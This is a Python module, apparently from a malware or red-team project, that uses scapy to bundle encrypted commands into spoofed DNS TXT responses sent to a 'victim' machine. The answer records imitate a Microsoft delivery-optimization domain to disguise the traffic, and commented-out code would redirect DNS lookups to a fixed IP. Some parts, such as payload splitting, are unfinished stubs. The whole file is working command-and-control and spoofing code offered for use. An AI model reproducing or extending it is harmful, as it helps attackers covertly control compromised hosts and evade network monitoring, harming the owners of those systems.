"""Bundles given commands into packets to be sent to the victim. 
"""
from scapy.all import *

class Bundler():

    def __init__(self, victim_mac, victim_packet):
        self.victim_mac = victim_mac
        self.victim_packet = victim_packet
        self.fake_hostname = self.victim_packet.getlayer(DNSQR).qname
        self.victim_id = victim_packet.getlayer(Ether).src

    def build_command_pkt(self, encrypted_comand):
        p = self._build_ether() / self._build_ip() / self._build_udp()/ self._build_dns(encrypted_comand)
        print(str(p))
        return p
    
    # TODO: Must break up large payload 
    def build_payload_pkts(self):
        pass

    def _build_packet(self):
        return self._build_ether()

    def _build_ether(self):
        # Not sure if we need src
        ether_layer = self.victim_packet.getlayer(Ether)
        return Ether(dst=ether_layer.src, src=ether_layer.dst)

    def _build_ip(self):
        ip_layer = self.victim_packet.getlayer(IP)
        return IP(dst=ip_layer.src, src=ip_layer.dst, ttl=128, version=4)
    
    def _build_udp(self):
        udp_layer = self.victim_packet.getlayer(UDP)
        return UDP(sport=udp_layer.dport, dport=udp_layer.sport)

    def _build_dns(self, payload):
        dns_layer = self.victim_packet.getlayer(DNS)
        dnsqr_layer = self.victim_packet.getlayer(DNSQR)
        return DNS(
            qr=1, rd=1, ra=1, ancount=1, nscount=0, arcount=0,
            ns=None, ar=None,
            qd = dnsqr_layer,
            an = DNSRR(
                rrname=self.victim_mac.minify() + '.cp501-prod.do.dsp.microsoft.com', # Update with spoof address
                type='TXT',
                rclass='IN', # Update?
                ttl=700,
                rdata=payload # Update with payload
            )
        )

        # dns_layer.qr = 1
        # dns_layer.rd = 1
        # dns_layer.ra = 1
        # dns_layer.ancount = 1
        # dns_layer.nscount = 0
        # dns_layer.arcount = 0
        # dns_layer.an = DNSRR(
        #     rrname = dnsqr_layer.qname,
        #     type = 'A',
        #     rclass = 'IN',
        #     ttl = 700,
        #     rdlen = 4,
        #     rdata = '172.217.6.202'
        # )
        # # dnsrr_layer.rdata = redirect
        # # dns_layer.an = dnsrr_layer
        # dns_layer.ns = None
        # dns_layer.ar = None

        # return dns_layer